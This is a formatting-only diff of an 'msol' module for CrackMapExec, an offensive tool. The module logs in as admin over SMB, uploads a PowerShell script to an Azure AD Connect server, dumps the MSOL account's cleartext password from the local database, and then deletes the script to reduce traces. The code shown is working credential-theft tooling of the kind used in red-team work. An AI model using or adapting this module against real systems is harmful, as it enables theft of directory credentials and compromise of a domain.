@@ -1,4 +1,4 @@
-# MSOL module for CME 
+# MSOL module for CME
 # Author of the module : https://twitter.com/Daahtk
 # Based on the article : https://blog.xpnsec.com/azuread-connect-for-redteam/
 from sys import exit
@@ -8,7 +8,9 @@ from cme.helpers.powershell import get_ps_script
 
 class CMEModule:
     name = "msol"
-    description = "Dump MSOL cleartext password from the localDB on the Azure AD-Connect Server"
+    description = (
+        "Dump MSOL cleartext password from the localDB on the Azure AD-Connect Server"
+    )
     supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = True
@@ -37,7 +39,7 @@ class CMEModule:
         self.use_embedded = True
         self.msolmdl = self.cmd = ""
 
-        with open(get_ps_script('msol_dump/msol_dump.ps1'), 'r') as msolsc:
+        with open(get_ps_script("msol_dump/msol_dump.ps1"), "r") as msolsc:
             self.msol_embedded = msolsc.read()
 
         if "MSOL_PS1" in module_options:
@@ -51,7 +53,7 @@ class CMEModule:
     def on_admin_login(self, context, connection):
         if self.use_embedded:
             file_to_upload = "/tmp/msol.ps1"
-            with open(file_to_upload, 'w') as msol:
+            with open(file_to_upload, "w") as msol:
                 msol.write(self.msol_embedded)
         else:
             if path.isfile(self.MSOL_PS1):
@@ -61,9 +63,11 @@ class CMEModule:
                 exit(1)
 
         context.log.display(f"Uploading {self.msol}")
-        with open(file_to_upload, 'rb') as msol:
+        with open(file_to_upload, "rb") as msol:
             try:
-                connection.conn.putFile(self.share, f"{self.tmp_share}{self.msol}", msol.read)
+                connection.conn.putFile(
+                    self.share, f"{self.tmp_share}{self.msol}", msol.read
+                )
                 context.log.success(f"Msol script successfully uploaded")
             except Exception as e:
                 context.log.fail(f"Error writing file to share {self.tmp_share}: {e}")
@@ -85,4 +89,6 @@ class CMEModule:
                 connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.msol}")
                 context.log.success(f"Msol script successfully deleted")
             except Exception as e:
-                context.log.fail(f"[OPSEC] Error deleting msol script on {self.share}: {e}")
+                context.log.fail(
+                    f"[OPSEC] Error deleting msol script on {self.share}: {e}"
+                )
